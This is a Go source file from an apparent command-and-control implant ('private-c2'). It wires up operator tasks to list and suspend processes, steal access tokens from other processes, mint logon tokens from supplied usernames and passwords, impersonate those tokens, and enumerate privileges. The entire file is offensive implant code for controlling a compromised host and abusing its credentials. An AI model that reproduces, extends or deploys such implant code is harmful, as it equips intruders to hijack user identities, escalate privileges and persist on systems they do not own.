package main

import (
	"context"
	"encoding/json"
	"fmt"
	"strconv"
	"strings"

	"github.com/azizbinmohammad/private-c2/implant/modules/process"
	"github.com/azizbinmohammad/private-c2/implant/modules/token"
)

// tokenManager owns tokens stolen or created during this implant's lifetime.
var tokenManager = token.NewManager()

// unmarshalArgs decodes a JSON task argument object; an empty argument string
// is treated as an empty object so status/list actions need no payload.
func unmarshalArgs(args string, v any) error {
	trimmed := strings.TrimSpace(args)
	if trimmed == "" {
		trimmed = "{}"
	}
	return json.Unmarshal([]byte(trimmed), v)
}

func parsePID(args string) (int, error) {
	pid, err := strconv.Atoi(strings.TrimSpace(args))
	if err != nil || pid <= 0 {
		return 0, fmt.Errorf("a positive PID is required")
	}
	return pid, nil
}

func handleProcessInfo(ctx context.Context, _ string) (string, error) {
	req, _ := json.Marshal(process.Request{Op: process.OpPS})
	out, err := process.Execute(ctx, req)
	if err != nil {
		return "", err
	}
	return string(out), nil
}

func handleProcessSuspend(ctx context.Context, args string) (string, error) {
	pid, err := parsePID(args)
	if err != nil {
		return "", err
	}
	req, _ := json.Marshal(process.Request{Op: process.OpSuspend, PID: pid})
	out, err := process.Execute(ctx, req)
	return string(out), err
}

func handleProcessResume(ctx context.Context, args string) (string, error) {
	pid, err := parsePID(args)
	if err != nil {
		return "", err
	}
	req, _ := json.Marshal(process.Request{Op: process.OpResume, PID: pid})
	out, err := process.Execute(ctx, req)
	return string(out), err
}

func handleTokenList(_ context.Context, _ string) (string, error) {
	tokens, err := tokenManager.List()
	if err != nil {
		return "", err
	}
	return marshalJSON(tokens)
}

func handleTokenSteal(_ context.Context, args string) (string, error) {
	pid, err := parsePID(args)
	if err != nil {
		return "", err
	}
	info, err := tokenManager.Steal(pid)
	if err != nil {
		return "", err
	}
	return marshalJSON(info)
}

type makeTokenRequest struct {
	Username  string `json:"username"`
	Password  string `json:"password"`
	Domain    string `json:"domain"`
	LogonType string `json:"logon_type"`
}

// parseMakeTokenArgs accepts either JSON or the CLI form
// "<username> <password> [domain]". The JSON form is required when the
// password contains spaces.
func parseMakeTokenArgs(args string) (makeTokenRequest, error) {
	var req makeTokenRequest
	trimmed := strings.TrimSpace(args)
	if strings.HasPrefix(trimmed, "{") {
		if err := json.Unmarshal([]byte(trimmed), &req); err != nil {
			return req, fmt.Errorf("parsing token_make JSON: %w", err)
		}
	} else {
		parts := strings.Fields(trimmed)
		if len(parts) < 2 || len(parts) > 3 {
			return req, fmt.Errorf("token_make args must be '<username> <password> [domain]' or JSON")
		}
		req.Username, req.Password = parts[0], parts[1]
		if len(parts) == 3 {
			req.Domain = parts[2]
		}
	}
	if req.Username == "" || req.Password == "" {
		return req, fmt.Errorf("token_make requires a username and password")
	}
	return req, nil
}

func handleTokenMake(_ context.Context, args string) (string, error) {
	req, err := parseMakeTokenArgs(args)
	if err != nil {
		return "", err
	}
	info, err := tokenManager.Make(req.Username, req.Password, req.Domain, req.LogonType)
	if err != nil {
		return "", err
	}
	return marshalJSON(info)
}

func handleTokenImpersonate(_ context.Context, args string) (string, error) {
	id := strings.TrimSpace(args)
	if id == "" {
		return "", fmt.Errorf("token_impersonate requires a token ID (see token_list)")
	}
	info, err := tokenManager.Impersonate(id)
	if err != nil {
		return "", err
	}
	return marshalJSON(info)
}

func handleTokenRevert(_ context.Context, _ string) (string, error) {
	n, err := tokenManager.Revert()
	if err != nil {
		return "", err
	}
	return marshalJSON(struct {
		Cleared int    `json:"cleared"`
		Note    string `json:"note"`
	}{n, "impersonation is task-scoped; stored token handles were closed"})
}

func handleGetprivs(_ context.Context, _ string) (string, error) {
	privs, err := platformPrivileges()
	if err != nil {
		return "", err
	}
	return marshalJSON(privs)
}
